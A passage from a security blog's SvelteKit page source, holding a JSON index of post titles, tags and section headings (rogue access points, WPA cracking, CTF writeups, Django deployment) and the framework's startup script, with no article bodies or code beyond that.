hostapdo\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2023-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/471e01a7-df63-414e-9370-6b8deafe6686\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/setup-fake-rogue-access-point-hostapd/+page.md\",\"path\":\"/blog/2023/setup-fake-rogue-access-point-hostapd\",\"toc\":[{\"depth\":2,\"title\":\"Technical Terms\",\"slug\":\"technical-terms\"},{\"depth\":3,\"title\":\"Phishing\",\"slug\":\"phishing\"},{\"depth\":3,\"title\":\"Wireless Adapter\",\"slug\":\"wireless-adapter\"},{\"depth\":3,\"title\":\"Is it Effective?\",\"slug\":\"is-it-effective\"},{\"depth\":2,\"title\":\"The Guide\",\"slug\":\"the-guide\"},{\"depth\":3,\"title\":\"Setup Environment\",\"slug\":\"setup-environment\"},{\"depth\":3,\"title\":\"Wireless Interface\",\"slug\":\"wireless-interface\"},{\"depth\":3,\"title\":\"Fake / Rogue Access Point\",\"slug\":\"fake--rogue-access-point\"},{\"depth\":3,\"title\":\"Multiple Access Points (Optional)\",\"slug\":\"multiple-access-points-optional\"},{\"depth\":3,\"title\":\"DHCP\",\"slug\":\"dhcp\"},{\"depth\":3,\"title\":\"Traffic Forwarding\",\"slug\":\"traffic-forwarding\"},{\"depth\":3,\"title\":\"MySQL Storage\",\"slug\":\"mysql-storage\"},{\"depth\":3,\"title\":\"Phishing Site\",\"slug\":\"phishing-site\"},{\"depth\":3,\"title\":\"Apache and MySQL\",\"slug\":\"apache-and-mysql\"},{\"depth\":3,\"title\":\"Deauthentication\",\"slug\":\"deauthentication\"},{\"depth\":3,\"title\":\"Credentials\",\"slug\":\"credentials\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"WPA(2) PMKID Hash Cracking (MIC) Process Explained\",\"tags\":[\"wireless\",\"wpa-wpa2\",\"wifi\"],\"categories\":[\"Writeups\"],\"summary\":\"A guide on what the MIC is and how the actual WPA(2) cracking happens at lower level\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2024-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/51b06557-0a25-4ddd-a59d-6783add3a447\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal/+page.md\",\"path\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal\",\"toc\":[{\"depth\":2,\"title\":\"The Handshake Process\",\"slug\":\"the-handshake-process\"},{\"depth\":3,\"title\":\"(PML) Pairwise Master Key Computation\",\"slug\":\"pml-pairwise-master-key-computation\"},{\"depth\":3,\"title\":\"(PTK) Pairwise Transient Key Computation\",\"slug\":\"ptk-pairwise-transient-key-computation\"},{\"depth\":3,\"title\":\"(MIC) Message Integrity Code\",\"slug\":\"mic-message-integrity-code\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024\",\"tags\":[\"ctf\",\"cyber-apocalypse\",\"htb\",\"htb-2024\",\"web\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024\",\"created\":\"2024-03-14T00:00:00.000Z\",\"lastmod\":\"2024-03-14T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups/+page.md\",\"path\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"WEB\",\"slug\":\"web\"},{\"depth\":3,\"title\":\"Labyrinth Linguist - Easy\",\"slug\":\"labyrinth-linguist---easy\"},{\"depth\":3,\"title\":\"LockTalk\",\"slug\":\"locktalk\"},{\"depth\":3,\"title\":\"SerialFlow\",\"slug\":\"serialflow\"},{\"depth\":2,\"title\":\"Ending Note\",\"slug\":\"ending-note\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from PCC 23\",\"tags\":[\"pcc23\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"These are the writeups for web challenges from PCC 23 held at Air University Islamabad\",\"created\":\"2023-12-22T00:00:00.000Z\",\"lastmod\":\"2023-12-22T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/pcc-23-web-challenge-writeups/+page.md\",\"path\":\"/blog/2023/pcc-23-web-challenge-writeups\",\"toc\":[{\"depth\":1,\"title\":\"Qualifiers\",\"slug\":\"qualifiers\"},{\"depth\":3,\"title\":\"Secure ME\",\"slug\":\"secure-me\"},{\"depth\":1,\"title\":\"Finals\",\"slug\":\"finals\"},{\"depth\":3,\"title\":\"JazzME\",\"slug\":\"jazzme\"},{\"depth\":3,\"title\":\"Lama\",\"slug\":\"lama\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Blackhat MEA CTF Qualifiers Web Authy and Warm Me Up Writeup\",\"tags\":[\"blackhatmea\",\"ctf\",\"authy\",\"warmme-up\",\"unicode\",\"broken-logic\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for 2 of web challenges from Blackhat MEA Qualifier CTF Round namely Authy and Warm Me Up\",\"created\":\"2023-11-13T00:00:00.000Z\",\"lastmod\":\"2023-11-13T00:00:00.000Z\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.426Z\",\"slug\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup/+page.md\",\"path\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":3,\"title\":\"Authy\",\"slug\":\"authy\"},{\"depth\":3,\"title\":\"Warm Me Up\",\"slug\":\"warm-me-up\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Deploy a Django Application on Ubuntu 22.04 with Gunicorn & NGINX\",\"tags\":[\"django\",\"deployment\",\"development\",\"drf\",\"python\",\"ubuntu\"],\"categories\":[\"Linux\",\"Development\"],\"summary\":\"A Detailed walkthrough of the process of deploying a django application on a ubuntu server from scratch. This guide covers the deployment stages with Gunicorn, NGINX and Postgresql.\",\"created\":\"2023-09-11T00:00:00.000Z\",\"lastmod\":\"2023-10-29T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/ed7dd92d-f7d1-4646-9194-e02102945392\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22/+page.md\",\"path\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Tutorial\",\"slug\":\"tutorial\"},{\"depth\":3,\"title\":\"Pre-Reqs\",\"slug\":\"pre-reqs\"},{\"depth\":3,\"title\":\"Installing Packages\",\"slug\":\"installing-packages\"},{\"depth\":3,\"title\":\"Setting up Project Directory\",\"slug\":\"setting-up-project-directory\"},{\"depth\":3,\"title\":\"Setting up Postgres (Database)\",\"slug\":\"setting-up-postgres-database\"},{\"depth\":3,\"title\":\"Project Settings\",\"slug\":\"project-settings\"},{\"depth\":3,\"title\":\"Spin up the Project\",\"slug\":\"spin-up-the-project\"},{\"depth\":3,\"title\":\"Setting up Gunicorn\",\"slug\":\"setting-up-gunicorn\"},{\"depth\":3,\"title\":\"Setting UP NGINX\",\"slug\":\"setting-up-nginx\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution\",\"tags\":[\"amateurs-ctf\",\"writeup\",\"sanity\",\"xss\",\"dom-clobbering\",\"prototype-pollution\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.\",\"created\":\"2023-07-21T00:00:00.000Z\",\"lastmod\":\"2023-07-21T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.425Z\",\"slug\":\"/blog/2023/amateursctf-web-2023-writeup-sanity/+page.md\",\"path\":\"/blog/2023/amateursctf-web-2023-writeup-sanity\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Surface\",\"slug\":\"surface\"},{\"depth\":2,\"title\":\"Behind the Scenes\",\"slug\":\"behind-the-scenes\"},{\"depth\":3,\"title\":\"DOM Clobbering\",\"slug\":\"dom-clobbering\"},{\"depth\":3,\"title\":\"Attacker Server\",\"slug\":\"attacker-server\"},{\"depth\":3,\"title\":\"Prototype Pollution\",\"slug\":\"prototype-pollution\"},{\"depth\":4,\"title\":\"Proof of Concept (POC)\",\"slug\":\"proof-of-concept-poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover\",\"tags\":[\"dns-zone-takeover\",\"dns-zone-transfer\",\"subdomain-takeover\",\"bugbounty\",\"infosec\",\"reconnaissance\",\"automated-tool\"],\"categories\":[\"Bug Bounty\",\"Projects\"],\"summary\":\"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.\",\"created\":\"2023-06-30T00:00:00.000Z\",\"lastmod\":\"2023-06-30T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/subrake-a-dns-automated-scanner/+page.md\",\"path\":\"/blog/2023/subrake-a-dns-automated-scanner\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Subrake\",\"slug\":\"subrake\"},{\"depth\":2,\"title\":\"Explanation\",\"slug\":\"explanation\"},{\"depth\":3,\"title\":\"Zone Transfer\",\"slug\":\"zone-transfer\"},{\"depth\":3,\"title\":\"Subdomain Takeover\",\"slug\":\"subdomain-takeover\"},{\"depth\":3,\"title\":\"DNS Zone Takeover\",\"slug\":\"dns-zone-takeover\"},{\"depth\":4,\"title\":\"Finding Zone Takeover\",\"slug\":\"finding-zone-takeover\"},{\"depth\":2,\"title\":\"Using Subrake\",\"slug\":\"using-subrake\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"BSidesTLV CTF 2023 Browselicious (Misc) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"bsidestlv-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023\",\"created\":\"2023-06-28T00:00:00.000Z\",\"lastmod\":\"2023-06-28T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.428Z\",\"slug\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf/+page.md\",\"path\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf\",\"toc\":[{\"depth\":1,\"title\":\"Introducton\",\"slug\":\"introducton\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":3,\"title\":\"Server Request\",\"slug\":\"server-request\"},{\"depth\":3,\"title\":\"Code Review\",\"slug\":\"code-review\"},{\"depth\":3,\"title\":\"Exploit\",\"slug\":\"exploit\"},{\"depth\":4,\"title\":\"Input Field\",\"slug\":\"input-field\"},{\"depth\":4,\"title\":\"Race Condition\",\"slug\":\"race-condition\"},{\"depth\":4,\"title\":\"Post Message\",\"slug\":\"post-message\"},{\"depth\":2,\"title\":\"PoC\",\"slug\":\"poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Google CTF 2023 Under Construction (Web) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"google-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for under construction challenge from google ctf 2023\",\"created\":\"2023-06-27T00:00:00.000Z\",\"lastmod\":\"2023-06-27T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.428Z\",\"slug\":\"/blog/2023/writeup-under-construction-google-ctf-2023/+page.md\",\"path\":\"/blog/2023/writeup-under-construction-google-ctf-2023\",\"toc\":[{\"depth\":1,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":2,\"title\":\"Getting Started\",\"slug\":\"getting-started\"},{\"depth\":2,\"title\":\"Vulnerable Part\",\"slug\":\"vulnerable-part\"},{\"depth\":2,\"title\":\"Exploit\",\"slug\":\"exploit\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Privacy Policy\",\"created\":\"2023-06-27T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-09-29T20:20:13.428Z\",\"slug\":\"/privacy/+page.svelte.md\",\"path\":\"/privacy\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"SSTI Bypass using HTTP Request Referer and Cookie headers - My First App Writeup\",\"tags\":[\"UoftCTF\",\"writeup\",\"ssti\",\"template-injection\",\"jwt\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This is solution for My First App challenge from UofTCTF 23. It covers initial JWT cracking and then escalating it to SSTI. And then bypassing filters by using the request object attributes\",\"created\":\"2023-01-16T00:00:00.000Z\",\"lastmod\":\"2023-01-16T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/45d79cff-0f11-4c49-92cb-a530ee2c36a5\",\"flags\":[\"unlisted\"],\"updated\":\"2024-09-29T20:20:13.427Z\",\"slug\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23/+page.md\",\"path\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"About Me\",\"created\":\"2022-05-06T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-09-29T20:20:13.429Z\",\"slug\":\"/resume/+page.svelte.md\",\"path\":\"/resume\",\"toc\":[{\"depth\":2,\"title\":\"Skills\",\"slug\":\"skills\"},{\"depth\":2,\"title\":\"Experience\",\"slug\":\"experience\"},{\"depth\":2,\"title\":\"Education\",\"slug\":\"education\"},{\"depth\":2,\"title\":\"Certifications\",\"slug\":\"certifications\"},{\"depth\":2,\"title\":\"Acheivements\",\"slug\":\"acheivements\"},{\"depth\":2,\"title\":\"Projects\",\"slug\":\"projects\"},{\"depth\":2,\"title\":\"Volunteering and Startups\",\"slug\":\"volunteering-and-startups\"},{\"depth\":2,\"title\":\"Contact\",\"slug\":\"contact\"}],\"type\":\"article\",\"html\":\"\"}]"}</script>
			<script>
				{
					__sveltekit_dgz4hi = {
						base: new URL("../../..", location).pathname.slice(0, -1),
						env: {}
					};

					const element = document.currentScript.parentElement;

					const data = [null,null];

					Promise.all([
						import("../../../_app/immutable/entry/start.9390d2e8.js"),
						import("../../../_app/immutable/entry/app.4e0b84b7.js")
					]).then(([kit, app]) => {
						kit.start(app, element, {
							node_ids: [0, 7],
							data,
							form: null,
							error: null
						});
					});
				}
			</script>
		
    <div style="display: contents">%sveltekit.body%</div>
  </body>
</html>
